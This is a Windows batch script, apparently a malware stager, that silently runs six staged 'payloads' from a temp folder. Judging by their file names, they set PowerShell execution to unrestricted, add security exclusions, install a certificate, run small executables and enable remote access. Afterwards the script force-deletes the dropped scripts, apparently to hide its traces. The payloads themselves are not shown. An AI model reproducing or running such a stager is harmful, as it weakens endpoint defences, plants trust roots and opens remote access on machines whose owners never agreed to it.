@echo off
rem *******************************************************
rem mainpayload.run.cmd
rem This Script Runs all main target payloads
rem on local computer
rem *******************************************************
@echo off

rem Set Files and Directories
rem
set pathCMD=%SystemRoot%\System32
set WorkingDir=%TEMP%\mainexample.7

set CSCRIPTEXE=%pathCMD%\cscript.exe
set aFile0010=%WorkingDir%\set.powershell.unrestricted-silent.wsf
set aFile0020=%WorkingDir%\DnInstall-UserExclusions01Silent.wsf
set aFile0030=%WorkingDir%\DnInstall-TinyExclusionsSilent.wsf
set aFile0040=%WorkingDir%\DnInstall-CertInstallW10.Silent.wsf
set aFile0050=%WorkingDir%\nit-TinyExeFiles-run.silent.cmd
set aFile0060=%WorkingDir%\nit-remoteenable-run-silent.cmd

rem Check Integrity...
rem
if not exist %CSCRIPTEXE% echo %CSCRIPTEXE% is not found && exit /b 1
if not exist %aFile0010% echo %aFile0010% is not found && exit /b 1
if not exist %aFile0020% echo %aFile0020% is not found && exit /b 1
if not exist %aFile0030% echo %aFile0030% is not found && exit /b 1
if not exist %aFile0040% echo %aFile0040% is not found && exit /b 1
if not exist %aFile0050% echo %aFile0050% is not found && exit /b 1
if not exist %aFile0060% echo %aFile0060% is not found && exit /b 1

rem Run main Payloads...

%CSCRIPTEXE% //NoLogo //B %aFile0010%
rem TIMEOUT /T 7 /NOBREAK 

%CSCRIPTEXE% //NoLogo //B %aFile0020%
rem TIMEOUT /T 10 /NOBREAK 

%CSCRIPTEXE% //NoLogo //B %aFile0030%
rem TIMEOUT /T 10 /NOBREAK 

%CSCRIPTEXE% //NoLogo //B %aFile0040%
rem TIMEOUT /T 10 /NOBREAK 

call %aFile0050%
rem TIMEOUT /T 30 /NOBREAK 

call %aFile0060%
rem TIMEOUT /T 30 /NOBREAK 

rem Delete old Files...
rem
rem Sleep to 60 sec...
TIMEOUT /T 60 /NOBREAK 

del /Q /F %WorkingDir%\*.wsf
del /Q /F %aFile0050%
del /Q /F %aFile0060%
rem del /Q /F %WorkingDir%\*.cmd
del /Q /F %WorkingDir%\*.bat
del /Q /F %WorkingDir%\*.ps1

rem Exit
exit /b 0
